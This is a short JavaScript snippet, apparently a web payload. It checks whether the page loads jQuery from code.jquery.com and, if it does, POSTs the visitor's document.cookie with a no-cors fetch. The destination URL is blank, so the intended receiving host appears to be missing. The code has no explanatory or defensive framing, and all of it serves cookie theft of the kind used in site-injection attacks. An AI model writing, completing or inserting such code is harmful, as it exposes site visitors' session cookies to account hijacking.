var reg=/code\.jquery.com/ig;
if(document.body.innerHTML.match(reg) || document.head.innerHTML.match(reg)){
fetch('', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
}
